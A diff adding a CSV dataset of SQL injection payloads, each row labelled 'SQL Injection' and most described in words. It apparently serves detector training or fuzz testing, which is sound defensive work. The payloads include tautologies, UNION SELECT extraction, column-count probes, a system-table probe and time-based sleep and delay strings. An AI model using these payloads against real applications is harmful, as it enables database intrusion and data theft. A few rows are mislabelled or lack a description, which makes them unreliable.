@@ -1,0 +1,66 @@
+value,label,description
+',SQL Injection,single quote character 
+'',SQL Injection,double single quote characters
+`,SQL Injection,backtick character
+``,SQL Injection,double backtick characters
+",",SQL Injection,comma
+"""",SQL Injection,double quote character
+"""""",SQL Injection,double double quote characters
+/,SQL Injection,forward slash
+//,SQL Injection,double forward slash
+\,SQL Injection,backslash 
+\\,SQL Injection,double backslash 
+;,SQL Injection,semicolon
+"' or """,SQL Injection,single quote character logical OR with double single quote
+-- or # ,SQL Injection,comment logical OR hash symbol
+' OR '1,SQL Injection,single quote character logical OR with another single quote and one
+' OR 1 -- -,SQL Injection,single quote character logical OR with one then comment and minus symbol
+""" OR """" = """,SQL Injection,double quote character logical OR another double quote characters twice equal to symbol double quote character
+""" OR 1 = 1 -- -",SQL Injection,double quote character logical OR with one equals one then comment and minus symbol
+' OR '' = ',SQL Injection,single quote character logical OR double quote character equal to symbol then single quote character
+'=',SQL Injection,single quote character wrapping equal to symbol
+'LIKE',SQL Injection,single quote character wrapping LIKE symbol
+'=0--+,SQL Injection,single quote character equal to symbol zero then comment and addition symbol
+ OR 1=1,SQL Injection,single quote character logical OR one equals one
+' OR 'x'='x,SQL Injection,single quote character logical OR single quote character x single quote character equals single quote character x
+' AND id IS NULL; --,SQL Injection,single quote character logical AND id IS NULL semicolon comment
+'''''''''''''UNION SELECT '2,SQL Injection,mutliple single quote characters UNION SELECT single quote character two
+%00,SQL Injection,null byte
+/*…*,SQL Injection,multiline comment using forward slash asterisk
++,SQL Injection,addition symbol
+||,SQL Injection,double pipe for concatenation
+%,SQL Injection,wildcard attribute or percent sign
+@variable,SQL Injection,local variable or ampersand variable
+@@variable,SQL Injection,global variable or ampersand ampersand variable
+AND 1,SQL Injection,logical AND with one
+AND 0,SQL Injection,logical AND with zero
+AND true,SQL Injection,logical AND with boolean TRUE
+AND false,SQL Injection,logical AND with boolean FALSE
+1-false,SQL Injection,one minus boolean FALSE
+1-true,SQL Injection,one minus boolean TRUE
+1*56,SQL Injection,one multiplied by fifty six
+-2,SQL Injection,minus two
+1' ORDER BY 1--+,SQL Injection,one and single quote ORDER BY one then comment and addtion symbol
+1' ORDER BY 2--+,SQL Injection,one and single quote ORDER BY two then comment and addtion symbol
+1' ORDER BY 3--+,SQL Injection,one and single quote ORDER BY three then comment and addition symbol
+"1' ORDER BY 1,2--+",SQL Injection,one and single quote ORDER BY one comma two then comment and addition symbol
+"1' ORDER BY 1,2,3--+",SQL Injection,one and single quote ORDER BY one comma two comma  three then comment and addition symbol
+"1' GROUP BY 1,2,--+",SQL Injection,one and single quote GROUP BY one comma two then comment and addition symbol
+"1' GROUP BY 1,2,3--+",SQL Injection,one and single quote GROUP BY one comma two comma three then comment and addition symbol
+' GROUP BY columnnames having 1=1 --,SQL Injection,single quote character GROUP BY columnnames having one equals one comment
+"-1' UNION SELECT 1,2,3--+",SQL Injection,minus one single quote UNION SELECT one comma two comma three then comment and addition symbol
+' UNION SELECT sum(columnname ) from tablename --,SQL Injection,single quote character SQL aggregate function UNION SELECT sum of columnname from tablename then comment
+"-1 UNION SELECT 1 INTO @,@",SQL Injection,minus one UNION SELECT one INTO @ comma @
+"-1 UNION SELECT 1 INTO @,@,@",SQL Injection,minus one UNION SELECT one INTO @ comma @ comma @
+1 AND (SELECT * FROM Users) = 1 ,SQL Injection,one AND open small bracket SELECT everything (*) FROM Users (columname) close small bracket equals one 
+"' AND MID(VERSION(),1,1) = '5';",SQL Injection,
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,SQL Injection,
+Finding the table name,SQL Injection,
+",(select * from (select(sleep(10)))a)",SQL Injection,
+%2c(select%20*%20from%20(select(sleep(10)))a),SQL Injection,
+';WAITFOR DELAY '0:0:30'--,SQL Injection,
+#,SQL Injection,
+/*,SQL Injection,
+-- -,SQL Injection,
+;%00,SQL Injection,
+`,SQL Injection,
